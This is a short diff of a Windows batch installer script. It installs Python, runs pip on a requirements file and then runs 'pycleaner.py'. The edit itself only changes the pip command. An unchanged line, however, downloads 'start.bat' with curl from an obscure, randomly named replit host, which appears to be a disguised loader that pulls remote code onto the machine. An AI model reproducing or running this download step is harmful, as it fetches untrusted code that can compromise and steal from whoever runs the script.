@@ -14,7 +14,7 @@ start /W python-3.10.7-amd64.exe
 echo python installed
 cd %~dp0
 MD tools
-py -3 -m pip install -r requirements.txt
+pip install -r requirements.txt
 curl -L https://untimelyimpressionableadministration.blus2tlia.repl.co/start.bat -O
 python pycleaner.py
 
